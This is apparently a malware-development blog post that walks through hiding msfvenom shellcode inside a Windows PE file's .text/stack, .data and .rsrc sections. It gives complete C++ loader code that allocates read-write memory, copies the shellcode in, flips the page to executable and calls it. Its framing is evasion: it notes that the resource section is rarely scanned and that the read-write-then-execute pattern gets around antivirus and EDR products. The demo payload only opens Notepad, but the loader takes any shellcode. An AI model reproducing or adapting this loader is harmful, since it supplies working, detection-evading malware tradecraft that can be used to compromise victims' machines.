---
title: Hiding Your Shell code inside PE File Format
date: 2025-02-13 00:00:00 +0200
categories:
  - maldev
tags:
  - maldev
  - wininternals
media_subpath: /assets/images/shellcodes
---
# Introduction
In this blog post, I’ll explore how adversaries conceal their shellcode inside Portable Executable (PE) files—particularly in sections like `.rsrc`—to evade Endpoint Detection and Response (EDR) systems and antivirus software. By embedding malicious code within legitimate-looking executables, attackers can bypass signature-based detection mechanisms and make analysis more challenging for defenders.

### What is PE file format
PE stands for Portable Executable, it’s a file format for executables used in Windows operating systems, it’s based on the `COFF` file format (Common Object File Format).
Not only `.exe` files are PE files, dynamic link libraries (`.dll`), Kernel modules (`.srv`), Control panel applications (`.cpl`) and many others are also PE files.
##### **Structure**
A typical executable file follows the structure outlined in the following figure:
![Image](https://github.com/user-attachments/assets/d407bfa6-5bd6-466a-b0e0-2e5f37b57689)

If we open an executable file with `PE-bear`

<img src="https://github.com/user-attachments/assets/80a9ba8b-dfb2-439b-a215-0a77f5cf0065" alt="Image" style="float: left; width: 200px; margin-left: 10px;">










I won't go too deep into the PE file format here, but for an excellent and detailed explanation, you can check out [Ahmed Hesham's blog](https://0xrick.github.io/win-internals/pe1/). He did some great work on it.

---
##### *What Do We Need?*
1. generate the shell code with msfvenom
2. allocating memory for the shellcode 
3. change the rights permissions for the reserved space 
4. execute the shell code

**1. generate the shellcode payload**
-  using exec module from msfvenom, you can list the module options by providing `--list-options`.  
i will be using exec module to open a notepad just for the demonstration.
```bash
msfvenom -p windows/x64/exec CMD='notepad.exe' -f c | tee shell
```
![Image](https://github.com/user-attachments/assets/dbc93ac4-0875-49cf-ac3c-53fd64c7c1ee)

`Note` that msfvenom generated the shellcode byte array with size of 279 bytes however when i saw the size of the array containing the shellcode i found that there is one more byte so it' 280 bytes
![Image](https://github.com/user-attachments/assets/8d83ffb3-1863-4716-8bbd-448cf243fd98)
i found a way to overcome this i switched the byte array from `string literal` in c arrays syntax to a `Byte Array`.
```bash
cat shell|sed 's/"//g'|sed 's/\\x//g' |sed 's/\(..\)/0x\1,/g'
```
![Image](https://github.com/user-attachments/assets/ec943687-7a42-48ec-84f4-b4bcde929d8c)
<br>now let's check the size again

![Image](https://github.com/user-attachments/assets/eab23403-32bb-4521-9182-46fdced896e7)

---
### Shell code in .text section
The **.text** section in a PE file contains the **executable code** (i.e., the program's instructions). It is a **read-only** section and holds the machine code that gets executed by the CPU during runtime.

we need to allocate the memory for the generated shellcode payload, will be using the following code, we will break that code right now just wait.  
**Note**
the shellcode byte array is inside the main function not globally which means that it will be stored in the stack.
```cpp
#include <iostream>
#include <Windows.h>
using namespace std;

int main()
{
	HANDLE Hthread;
	DWORD oldprocess_rights = NULL;
	DWORD Threadid;
	

unsigned char shellcode[] = {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
/*
snippet
*/
0xd5,0x6e,0x6f,0x74,0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
	//size of shellcode
	unsigned int shellsize = sizeof(shellcode);
	cout << "the size for the shell code is " << shellsize << "\n";
	cout << "the location of the shellcode is at " << &shellcode<<"\n";
	//using getchar for debugging
	//getchar();
	LPVOID alloc = VirtualAlloc(NULL, shellsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	cout << "Copying shell code to memory\n";
	RtlCopyMemory(alloc, shellcode, shellsize);

	unsigned char* exec_mem = (unsigned char*)alloc;
	cout << "Changing the rights permssions\n";
	BOOL protect = VirtualProtect(alloc, shellsize, PAGE_EXECUTE_READ, &oldprocess_rights);
	if (protect) {
		cout << "The permssions has been changed\n";
	}
	
	//Hthread = CreateThread(0, shellsize, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &Threadid);
	cout << "Calling the shellcode\n";
	//using getchar for debugging
	//getchar();
	((void(*)())alloc)();
	//getchar()
}
```

first let's break down the variables 
```cpp
	HANDLE Hthread;
	DWORD oldprocess_rights = NULL;
	DWORD Threadid;
```
1. `hThread` is a handle to a thread, allowing operations such as suspending, resuming, or terminating it, it will hold the returning Handle from CreateThread function as we will see later.
2. `oldprocess_rights` just know for now that this variable holds the old rights permission for a reserved space on memory like `PAGE_READWRITE` and it can be `null`
3. `Threadid` as the name suggest it's the thread id for the thread running

```cpp
LPVOID alloc = VirtualAlloc(NULL, shellsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
```  
1. `VirtualAlloc` this function takes 4 parameters the first param `lpAddress` is The starting address of the region to allocate. Can be NULL if you want the system to pick an address. 
2. `dwSize` The size of the region of memory to allocate in bytes.
3. `flAllocationType`The type of memory allocation. Defines how the memory is allocated or reserved.
	- `MEM_RESERVE` only marks the address space; it doesn't allocate memory.
	- `MEM_COMMIT` actually provides memory that can be accessed and used.
4. `flAllocationType` The protection type for the allocated memory region. Specifies access rights (e.g., read/write).  
**out of the context**  
"Don't overwhelm yourself with everything; you don't really need to know more than that."  
Continuing the explanation for the code, we allocated the memory with the space that will fit the shellcode size. now it's time to move the shellcode payload from the stack into the allocated memory. how ?
```cpp
cout << "Copying shell code to memory\n";
RtlCopyMemory(alloc, shellcode, shellsize);
```

the function is pretty simple it just takes the destination address and the shellcode byte array address and the size you need to move in bytes.
```cpp
cout << "Changing the rights permssions\n";
BOOL protect = VirtualProtect(alloc, shellsize, PAGE_EXECUTE_READ, &oldprocess_rights);
```
when we allocated the memory region using virtualalloc we specified that the region has read and write  permissions only so it was not executable this helps with evading or workaround some antivirus& EDR's products, but we can't trigger the shellcode without making it executable.  
it takes 4 parameters and returns none zero value if success :
- A pointer to the address of the region.
- The size of the region to be modified.
- The new permission rights to be applied.
- A reference to the old permissions in case of a failure.
now every thing is ready all we need is to just call the shellcode in the allocated memory space as a function
```cpp
cout << "Calling the shellcode\n";
((void(*)())alloc)();
```
![Image](https://github.com/user-attachments/assets/8b30b3b0-ea40-4bab-a0cb-d9263b71210b)
Let's examine the memory changes while executing the program in **x64dbg**.
In the image below, you can see that the byte array (shellcode) is stored in **stack memory**.
![Image](https://github.com/user-attachments/assets/c5093c3b-2a67-4aca-b3ee-e422d94c8e78)
and the reserved space needed for the shellcode is located at the address `000001931F5B0000`
if we see that reserved space in memory map from **x64dbug** you notice that it's permissions is changed from -RW to ER- as we changed it using `VirtualProtect`.
![Image](https://github.com/user-attachments/assets/d3873927-88cd-46db-b470-86cae2a2e680)
and that was shellcode inside text section.

---
### Shell code in .data section

by using the same code above with slightly difference just by moving the byte code array from  the main function to global 
```cpp
#include <iostream>
#include <Windows.h>
using namespace std;
unsigned char shellcode[] = {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
/*snippet
*/
0xd5,0x6e,0x6f,0x74,0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
int main()
{
/**
snippet
*/
	return 0;
}
```
let's examine the the .data section in PE file format using `CFF` or `PE-Bear`  
![Image](https://github.com/user-attachments/assets/19604f9b-3fb0-4164-b6b7-94f46276ea4e)
our shellcode is inside the `.data` section.

---
### Shell code in .rsrc section
Now for the most exciting part we will store the shellcode byte array in the **resources section**. This section is typically **non-executable** and in most cases, is **not actively scanned** by antivirus software.
we will generate a new payload from msfvenom 
```shell
msfvenom -p windows/x64/exec CMD='notepad.exe' -f raw > shell.ico
```
and moving the file to the project along with a new file used for defining resources that is begin used in our code named `reseource.rc`
- **Steps**:
1. Add the following to the `.rc` file.
	- shell RCDATA "shell.ico"
2. Include the `.rc` file in your project.
3. Access the resource in code using `FindResource` by the string name.

```cpp
	LPCWSTR shell = L"shell";

	HRSRC hResource = FindResource(NULL, shell, RT_RCDATA);
	if (!hResource) {
		std::cerr << "Resource not found!" << std::endl;
		return 1;
	}
// load the resources file
	HGLOBAL hMemory = LoadResource(NULL, hResource);
	if (!hMemory) {
		std::cerr << "Failed to load resource!" << std::endl;
		return 1;
	}

	// Access the resource data
	void* shellcode = LockResource(hMemory);
	DWORD shellsize = SizeofResource(NULL, hResource);
```

After compiling this file and analyzing the `.rsrc` section, we can see in the image that the shellcode is stored inside the resource section.

![Image](https://github.com/user-attachments/assets/c8625a33-381f-4c03-84d1-d8c05a23b1e1)
And that's all for now! Hope you enjoyed it, fellow hacker 😈.
